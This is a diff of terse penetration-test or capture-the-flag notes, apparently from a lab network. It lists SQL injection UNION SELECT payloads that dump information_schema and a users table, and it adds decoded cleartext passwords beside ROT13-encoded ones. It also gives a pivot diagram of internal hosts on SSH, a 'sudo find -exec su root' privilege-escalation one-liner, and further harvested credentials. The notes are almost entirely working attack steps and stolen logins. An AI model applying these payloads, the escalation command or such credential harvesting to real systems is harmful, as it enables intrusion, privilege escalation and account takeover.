@@ -4,9 +4,9 @@
 product=7 UNION SELECT table_name,1,column_name FROM information_schema.columns
 product=7 UNION SELECT * FROM users
 
-     - Aaron - ncnffjbeqlCn$$jbeq
-     - user2 - RntyrfVfNER78 
-     - user3 - Obo4GURRnccyrf 
+     - Aaron - ncnffjbeqlCn$$jbeq - apasswordyPa$$word
+     - user2 - RntyrfVfNER78 - EaglesIsARE78
+     - user3 - Obo4GURRnccyrf - Bob4THEEapples
      - Lroth - anotherpassword4THEages
 
 +---------+  PublicFacingWebsite
@@ -23,11 +23,12 @@ product=7 UNION SELECT * FROM users
      V
 +---------+ RoundSensor
 |         | 192.168.28.172               root access: sudo find . -exec su root \; -quit
-|         | Aaron = apasswordyPa$$word
+|         | Aaron - apasswordyPa$$word
 +---------+ 22
     |
     V
-+---------+  
++---------+ Internal Window
 |         | 192.168.28.179
-|         |
+|         | Lroth - anotherpassword4THEages
 +---------+ 22 
+            9999 Secur Server
